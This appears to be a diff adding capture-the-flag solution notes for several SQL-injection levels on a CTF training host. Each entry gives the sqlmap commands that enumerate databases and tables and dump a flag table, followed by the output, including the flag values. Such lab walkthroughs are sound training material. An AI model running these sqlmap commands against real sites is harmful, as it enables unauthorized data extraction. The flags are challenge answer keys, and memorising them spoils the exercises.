@@ -1455,3 +1455,141 @@ if __name__ == '__main__':
 
 spbctf{0h_h3r3_w3_g0_4g4in__but_w41t_it_s_too_long_c4n_i_f37ch_17_all__pl3453_st0p_wr1t1ng_such_r4nd0m_w0rd5_here}
 
+...
+...
+...
+
+68) http://kslweb1.spb.ctf.su/third/level24/?
+
+sqlmap -u "http://kslweb1.spb.ctf.su/third/level24/?product_id=1" --dbs
+
+->
+
+[22:09:42] [INFO] the back-end DBMS is MySQL
+available databases [2]:
+[*] information_schema
+[*] level24
+---
+
+sqlmap -u "http://kslweb1.spb.ctf.su/third/level24/?product_id=1" -D level24 --tables
+
+->
+
+Database: level24
+[3 tables]
++-----------+
+| flag      |
+| not_flag2 |
+| products  |
++-----------+
+
+---
+
+sqlmap -u "http://kslweb1.spb.ctf.su/third/level24/?product_id=1" -D level24 -T flag --columns
+
+->
+
+[1 column]
++--------+------+
+| Column | Type |
++--------+------+
+| flag   | text |
++--------+------+
+
+---
+
+sqlmap -u "http://kslweb1.spb.ctf.su/third/level24/?product_id=1" -D level24 -T flag --dump
+
+->
+
+Database: level24
+Table: flag
+[1 entry]
++---------------------------------------+
+| flag                                  |
++---------------------------------------+
+| KSL{164c45c9d60377a2dac48573c5032f3f} |
++---------------------------------------+
+
+69) http://kslweb1.spb.ctf.su/third/level25/?
+
+sqlmap -u "http://kslweb1.spb.ctf.su/third/level25/?" --data="query=test" --risk=3 --dbs
+
+->
+
+available databases [2]:
+[*] information_schema
+[*] level25
+
+---
+
+sqlmap -u "http://kslweb1.spb.ctf.su/third/level25/?" --data="query=test" --risk=3 -D level25 --tables
+
+->
+
+Database: level25
+[2 tables]
++----------+
+| flag     |
+| products |
++----------+
+
+---
+
+sqlmap -u "http://kslweb1.spb.ctf.su/third/level25/?" --data="query=test" -D level25 -T flag --dump
+
+->
+
+Database: level25
+Table: flag
+[1 entry]
++---------------------------------------+
+| flag                                  |
++---------------------------------------+
+| KSL{0ad94627ddbea090607cd26d81105c4c} |
++---------------------------------------+
+
+70) http://kslweb1.spb.ctf.su/third/level26/
+
+sqlmap -u "http://kslweb1.spb.ctf.su/third/level26/" --risk=3 --level=5 --headers="User-agent: test" --dbms=mysql --threads=10 -D level26 -T flag --dump
+
+->
+
+Database: level26
+Table: flag
+[1 entry]
++---------------------------------------+
+| flag                                  |
++---------------------------------------+
+| KSL{0c9b5c8931db3504543b87f0c890d2ba} |
++---------------------------------------+
+
+71) http://kslweb1.spb.ctf.su/third/level27/
+
+sqlmap -u "http://kslweb1.spb.ctf.su/third/level27/?product_id=1" --dbms=mysql -D level27 -T flag --dump
+
+->
+
+Database: level27
+Table: flag
+[1 entry]
++---------------------------------------+
+| flag                                  |
++---------------------------------------+
+| KSL{af6c2f971acf764e1b031360545f48bd} |
++---------------------------------------+
+
+72) http://kslweb1.spb.ctf.su/sqli/logineasy/
+
+sqlmap -u "http://kslweb1.spb.ctf.su/sqli/logineasy/?logout" --batch --data="login=admin&password=admin" --risk=3 --level=5 -D login1 -T flag --dump
+
+->
+
+Database: login1
+Table: flag
+[1 entry]
++---------+
+| VVVV    |
++---------+
+| <blank> |
++---------+
